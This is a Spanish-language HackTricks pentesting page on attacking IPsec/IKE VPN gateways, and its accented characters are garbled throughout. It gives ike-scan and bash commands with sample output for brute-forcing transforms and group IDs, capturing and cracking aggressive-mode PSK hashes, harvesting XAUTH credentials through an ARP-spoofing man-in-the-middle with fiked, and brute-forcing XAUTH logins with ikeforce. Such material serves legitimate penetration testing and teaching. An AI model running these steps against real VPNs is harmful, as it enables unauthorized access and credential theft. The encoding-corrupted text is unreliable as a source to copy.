# 500/udp - Pentesting IPsec/IKE VPN

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}

## Informaci칩n B치sica

**IPsec** es ampliamente reconocido como la principal tecnolog칤a para asegurar las comunicaciones entre redes (LAN a LAN) y desde usuarios remotos hasta la puerta de enlace de la red (acceso remoto), sirviendo como la columna vertebral para soluciones de VPN empresariales.

El establecimiento de una **asociaci칩n de seguridad (SA)** entre dos puntos es gestionado por **IKE**, que opera bajo el paraguas de ISAKMP, un protocolo dise침ado para la autenticaci칩n y el intercambio de claves. Este proceso se desarrolla en varias fases:

* **Fase 1:** Se crea un canal seguro entre dos puntos finales. Esto se logra mediante el uso de una Clave Precompartida (PSK) o certificados, empleando ya sea el modo principal, que involucra tres pares de mensajes, o **modo agresivo**.
* **Fase 1.5:** Aunque no es obligatorio, esta fase, conocida como la Fase de Autenticaci칩n Extendida, verifica la identidad del usuario que intenta conectarse al requerir un nombre de usuario y una contrase침a.
* **Fase 2:** Esta fase est치 dedicada a negociar los par치metros para asegurar los datos con **ESP** y **AH**. Permite el uso de algoritmos diferentes a los de la Fase 1 para asegurar la **Perfect Forward Secrecy (PFS)**, mejorando la seguridad.

**Puerto por defecto:** 500/udp

## **Descubrir** el servicio usando nmap
```
root@bt:~# nmap -sU -p 500 172.16.21.200
Starting Nmap 5.51 (http://nmap.org) at 2011-11-26 10:56 IST
Nmap scan report for 172.16.21.200
Host is up (0.00036s latency).
PORT    STATE SERVICE
500/udp open  isakmp
MAC Address: 00:1B:D5:54:4D:E4 (Cisco Systems)
```
## **Encontrar una transformaci칩n v치lida**

La configuraci칩n de IPSec puede estar preparada solo para aceptar una o unas pocas transformaciones. Una transformaci칩n es una combinaci칩n de valores. **Cada transformaci칩n** contiene una serie de atributos como DES o 3DES como el **algoritmo de cifrado**, SHA o MD5 como el **algoritmo de integridad**, una clave precompartida como el **tipo de autenticaci칩n**, Diffie-Hellman 1 o 2 como el **algoritmo de distribuci칩n de claves** y 28800 segundos como la **vida 칰til**.

Entonces, lo primero que tienes que hacer es **encontrar una transformaci칩n v치lida**, para que el servidor hable contigo. Para hacerlo, puedes usar la herramienta **ike-scan**. Por defecto, Ike-scan funciona en modo principal y env칤a un paquete a la puerta de enlace con un encabezado ISAKMP y una 칰nica propuesta con **ocho transformaciones dentro de ella**.

Dependiendo de la respuesta, puedes obtener informaci칩n sobre el punto final:
```
root@bt:~# ike-scan -M 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=d90bf054d6b76401)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

Ending ike-scan 1.9: 1 hosts scanned in 0.015 seconds (65.58 hosts/sec). 1 returned handshake; 0 returned notify
```
Como puedes ver en la respuesta anterior, hay un campo llamado **AUTH** con el valor **PSK**. Esto significa que el vpn est치 configurado utilizando una clave precompartida (y esto es realmente bueno para un pentester).\
**El valor de la 칰ltima l칤nea tambi칠n es muy importante:**

* _0 returned handshake; 0 returned notify:_ Esto significa que el objetivo **no es una puerta de enlace IPsec**.
* _**1 returned handshake; 0 returned notify:**_ Esto significa que el **objetivo est치 configurado para IPsec y est치 dispuesto a realizar la negociaci칩n IKE, y uno o m치s de los transformaciones que propusiste son aceptables** (una transformaci칩n v치lida se mostrar치 en la salida).
* _0 returned handshake; 1 returned notify:_ Las puertas de enlace VPN responden con un mensaje de notificaci칩n cuando **ninguna de las transformaciones es aceptable** (aunque algunas puertas de enlace no lo hacen, en cuyo caso se debe intentar un an치lisis adicional y una propuesta revisada).

Entonces, en este caso ya tenemos una transformaci칩n v치lida, pero si est치s en el tercer caso, entonces necesitas **forzar un poco para encontrar una transformaci칩n v치lida:**

Primero que todo, necesitas crear todas las transformaciones posibles:
```bash
for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do echo "--trans=$ENC,$HASH,$AUTH,$GROUP" >> ike-dict.txt ;done ;done ;done ;done
```
Y luego fuerza bruta cada uno usando ike-scan (esto puede tardar varios minutos):
```bash
while read line; do (echo "Valid trans found: $line" && sudo ike-scan -M $line <IP>) | grep -B14 "1 returned handshake" | grep "Valid trans found" ; done < ike-dict.txt
```
Si el ataque de fuerza bruta no funcion칩, tal vez el servidor est칠 respondiendo sin handshakes incluso a transformaciones v치lidas. Entonces, podr칤as intentar el mismo ataque de fuerza bruta pero utilizando el modo agresivo:
```bash
while read line; do (echo "Valid trans found: $line" && ike-scan -M --aggressive -P handshake.txt $line <IP>) | grep -B7 "SA=" | grep "Valid trans found" ; done < ike-dict.txt
```
Esperemos que **una transformaci칩n v치lida sea devuelta**.\
Puedes intentar el **mismo ataque** usando [**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py).\
Tambi칠n podr칤as intentar forzar transformaciones con [**ikeforce**](https://github.com/SpiderLabs/ikeforce):
```bash
./ikeforce.py <IP> # No parameters are required for scan -h for additional help
```
![](<../.gitbook/assets/image (617).png>)

En **DH Group: 14 = 2048-bit MODP** y **15 = 3072-bit**\
**2 = HMAC-SHA = SHA1 (en este caso). El formato `--trans` es $Enc,$Hash,$Auth,$DH**

Cisco indica evitar el uso de los grupos DH 1 y 2 porque no son lo suficientemente fuertes. Los expertos creen que **los pa칤ses con muchos recursos pueden romper f치cilmente la encriptaci칩n** de datos que utilizan estos grupos d칠biles. Esto se hace utilizando un m칠todo especial que los prepara para descifrar los c칩digos r치pidamente. Aunque cuesta mucho dinero establecer este m칠todo, permite a estos pa칤ses poderosos leer los datos encriptados en tiempo real si est치n utilizando un grupo que no es fuerte (como 1,024-bit o menor).

### Huella digital del servidor

Luego, puedes usar ike-scan para intentar **descubrir el proveedor** del dispositivo. La herramienta env칤a una propuesta inicial y deja de reproducir. Luego, **analiza** la **diferencia** de **tiempo** **entre** los **mensajes** recibidos del servidor y el patr칩n de respuesta correspondiente, el pentester puede identificar con 칠xito el proveedor de la puerta de enlace VPN. Adem치s, algunos servidores VPN utilizar치n la **carga 칰til opcional de ID de proveedor (VID)** con IKE.

**Especifica la transformaci칩n v치lida si es necesario** (usando --trans)

Si IKE descubre qui칠n es el proveedor, lo imprimir치:
```
root@bt:~# ike-scan -M --showbackoff 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=4f3ec84731e2214a)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

IKE Backoff Patterns:

IP Address       No.  Recv time            Delta Time
172.16.21.200    1    1322286031.744904    0.000000
172.16.21.200    2    1322286039.745081    8.000177
172.16.21.200    3    1322286047.745989    8.000908
172.16.21.200    4    1322286055.746972    8.000983
172.16.21.200    Implementation guess: Cisco VPN Concentrator

Ending ike-scan 1.9: 1 hosts scanned in 84.080 seconds (0.01 hosts/sec). 1 returned handshake; 0 returned notify
```
Esto tambi칠n se puede lograr con el script de nmap _**ike-version**_

## Encontrar el ID correcto (nombre del grupo)

Para poder capturar el hash, necesitas una transformaci칩n v치lida que soporte el modo agresivo y el ID correcto (nombre del grupo). Probablemente no conocer치s el nombre del grupo v치lido, as칤 que tendr치s que forzarlo.\
Para hacerlo, te recomendar칤a 2 m칠todos:

### Forzando el ID con ike-scan

Primero que nada, intenta hacer una solicitud con un ID falso tratando de recopilar el hash ("-P"):
```bash
ike-scan -P -M -A -n fakeID <IP>
```
Si **no se devuelve ning칰n hash**, entonces probablemente este m칠todo de fuerza bruta funcionar치. **Si se devuelve alg칰n hash, esto significa que se enviar치 un hash falso para una ID falsa, por lo que este m칠todo no ser치 confiable** para forzar la ID. Por ejemplo, podr칤a devolverse un hash falso (esto ocurre en versiones modernas):

![](<../.gitbook/assets/image (917).png>)

Pero si, como he dicho, no se devuelve ning칰n hash, entonces deber칤as intentar forzar nombres de grupo comunes usando ike-scan.

Este script **intentar칠 forzar posibles IDs** y devolver치 las IDs donde se devuelve un apret칩n de manos v치lido (este ser치 un nombre de grupo v치lido).

Si has descubierto una transformaci칩n espec칤fica, agr칠gala en el comando ike-scan. Y si has descubierto varias transformaciones, si칠ntete libre de agregar un nuevo bucle para probarlas todas (deber칤as probarlas todas hasta que una de ellas funcione correctamente).

Puedes usar el [diccionario de ikeforce](https://github.com/SpiderLabs/ikeforce/blob/master/wordlists/groupnames.dic) o [el de seclists](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/ike-groupid.txt) de nombres de grupo comunes para forzarlos:
```bash
while read line; do (echo "Found ID: $line" && sudo ike-scan -M -A -n $line <IP>) | grep -B14 "1 returned handshake" | grep "Found ID:"; done < /usr/share/wordlists/external/SecLists/Miscellaneous/ike-groupid.txt
```
Or use this dict (es una combinaci칩n de los otros 2 dicts sin repeticiones):

{% file src="../.gitbook/assets/vpnIDs.txt" %}

### Bruteforcing ID con Iker

[**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py) tambi칠n utiliza **ike-scan** para hacer bruteforce a posibles nombres de grupo. Sigue su propio m칠todo para **encontrar un ID v치lido basado en la salida de ike-scan**.

### Bruteforcing ID con ikeforce

[**ikeforce.py**](https://github.com/SpiderLabs/ikeforce) es una herramienta que se puede usar para **hacer bruteforce a IDs tambi칠n**. Esta herramienta **intenta explotar diferentes vulnerabilidades** que podr칤an usarse para **distinguir entre un ID v치lido y un ID no v치lido** (podr칤a tener falsos positivos y falsos negativos, por eso prefiero usar el m칠todo ike-scan si es posible).

Por defecto, **ikeforce** enviar치 al principio algunos IDs aleatorios para verificar el comportamiento del servidor y determinar la t치ctica a usar.

* El **primer m칠todo** es hacer bruteforce a los nombres de grupo buscando la informaci칩n de **Dead Peer Detection DPD** de los sistemas Cisco (esta informaci칩n solo es respondida por el servidor si el nombre del grupo es correcto).
* El **segundo m칠todo** disponible es **verificar el n칰mero de respuestas enviadas a cada intento** porque a veces se env칤an m치s paquetes cuando se usa el ID correcto.
* El **tercer m칠todo** consiste en **buscar "INVALID-ID-INFORMATION" en respuesta a un ID incorrecto**.
* Finalmente, si el servidor no responde nada a las verificaciones, **ikeforce** intentar치 hacer bruteforce al servidor y verificar si cuando se env칤a el ID correcto, el servidor responde con alg칰n paquete.\
Obviamente, el objetivo de hacer bruteforce al ID es obtener el **PSK** cuando tienes un ID v치lido. Luego, con el **ID** y el **PSK** tendr치s que hacer bruteforce al XAUTH (si est치 habilitado).

Si has descubierto una transformaci칩n espec칤fica, a침치dela en el comando de ikeforce. Y si has descubierto varias transformaciones, si칠ntete libre de agregar un nuevo bucle para probarlas todas (deber칤as probarlas todas hasta que una de ellas funcione correctamente).
```bash
git clone https://github.com/SpiderLabs/ikeforce.git
pip install 'pyopenssl==17.2.0' #It is old and need this version of the library
```

```bash
./ikeforce.py <IP> -e -w ./wordlists/groupnames.dic
```
### Sniffing ID

(Del libro **Network Security Assessment: Know Your Network**): Tambi칠n es posible obtener nombres de usuario v치lidos al esnifar la conexi칩n entre el cliente VPN y el servidor, ya que el primer paquete del modo agresivo que contiene el ID del cliente se env칤a en claro.

![](<../.gitbook/assets/image (891).png>)

## Capturing & cracking the hash

Finalmente, si has encontrado una **transformaci칩n v치lida** y el **nombre del grupo** y si se **permite el modo agresivo**, entonces puedes capturar muy f치cilmente el hash que se puede romper:
```bash
ike-scan -M -A -n <ID> --pskcrack=hash.txt <IP> #If aggressive mode is supported and you know the id, you can get the hash of the passwor
```
El hash se guardar치 dentro de _hash.txt_.

Puedes usar **psk-crack**, **john** (usando [**ikescan2john.py**](https://github.com/truongkma/ctf-tools/blob/master/John/run/ikescan2john.py)) y **hashcat** para **crackear** el hash:
```bash
psk-crack -d <Wordlist_path> psk.txt
```
## **XAuth**

**El modo agresivo IKE** combinado con una **clave precompartida (PSK)** se emplea com칰nmente para **autenticaci칩n de grupo**. Este m칠todo se complementa con **XAuth (Autenticaci칩n Extendida)**, que sirve para introducir una capa adicional de **autenticaci칩n de usuario**. Tal autenticaci칩n t칤picamente aprovecha servicios como **Microsoft Active Directory**, **RADIUS** o sistemas comparables.

Al pasar a **IKEv2**, se observa un cambio notable donde se utiliza **EAP (Protocolo de Autenticaci칩n Extensible)** en lugar de **XAuth** con el prop칩sito de autenticar usuarios. Este cambio subraya una evoluci칩n en las pr치cticas de autenticaci칩n dentro de los protocolos de comunicaci칩n segura.

### Captura de credenciales MitM en la red local

As칤 puedes capturar los datos de inicio de sesi칩n usando _fiked_ y ver si hay alg칰n nombre de usuario predeterminado (Necesitas redirigir el tr치fico IKE a `fiked` para el sniffing, lo cual se puede hacer con la ayuda de ARP spoofing, [m치s info](https://opensourceforu.com/2012/01/ipsec-vpn-penetration-testing-backtrack-tools/)). Fiked actuar치 como un punto final de VPN y capturar치 las credenciales de XAuth:
```bash
fiked -g <IP> -k testgroup:secretkey -l output.txt -d
```
Tambi칠n, usando IPSec intenta realizar un ataque MitM y bloquear todo el tr치fico al puerto 500, si el t칰nel IPSec no se puede establecer, tal vez el tr치fico se enviar치 en claro.

### Fuerza bruta del nombre de usuario y contrase침a XAUTH con ikeforce

Para realizar fuerza bruta del **XAUTH** (cuando conoces un nombre de grupo **id** v치lido y el **psk**) puedes usar un nombre de usuario o una lista de nombres de usuario y una lista de contrase침as:
```bash
./ikeforce.py <IP> -b -i <group_id> -u <username> -k <PSK> -w <passwords.txt> [-s 1]
```
De esta manera, ikeforce intentar치 conectarse utilizando cada combinaci칩n de nombre de usuario:contrase침a.

Si encontraste una o varias transformaciones v치lidas, simplemente 칰salas como en los pasos anteriores.

## Autenticaci칩n con una VPN IPSEC

En Kali, **VPNC** se utiliza para establecer t칰neles IPsec. Los **perfiles** deben estar ubicados en el directorio `/etc/vpnc/`. Puedes iniciar estos perfiles utilizando el comando _**vpnc**_.

Los siguientes comandos y configuraciones ilustran el proceso de configuraci칩n de una conexi칩n VPN con VPNC:
```bash
root@system:~# cat > /etc/vpnc/samplevpn.conf << STOP
IPSec gateway [VPN_GATEWAY_IP]
IPSec ID [VPN_CONNECTION_ID]
IPSec secret [VPN_GROUP_SECRET]
IKE Authmode psk
Xauth username [VPN_USERNAME]
Xauth password [VPN_PASSWORD]
STOP
root@system:~# vpnc samplevpn
VPNC started in background (pid: [PID])...
root@system:~# ifconfig tun0
```
En esta configuraci칩n:

* Reemplace `[VPN_GATEWAY_IP]` con la direcci칩n IP real del gateway VPN.
* Reemplace `[VPN_CONNECTION_ID]` con el identificador de la conexi칩n VPN.
* Reemplace `[VPN_GROUP_SECRET]` con el secreto del grupo de la VPN.
* Reemplace `[VPN_USERNAME]` y `[VPN_PASSWORD]` con las credenciales de autenticaci칩n de la VPN.
* `[PID]` simboliza el ID del proceso que se asignar치 cuando `vpnc` inicie.

Aseg칰rese de que se utilicen valores reales y seguros para reemplazar los marcadores de posici칩n al configurar la VPN.

## Material de Referencia

* [PSK cracking paper](http://www.ernw.de/download/pskattack.pdf)
* [SecurityFocus Infocus](http://www.securityfocus.com/infocus/1821)
* [Scanning a VPN Implementation](http://www.radarhack.com/dir/papers/Scanning\_ike\_with\_ikescan.pdf)
* Network Security Assessment 3rd Edition

## Shodan

* `port:500 IKE`

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
</details>
{% endhint %}
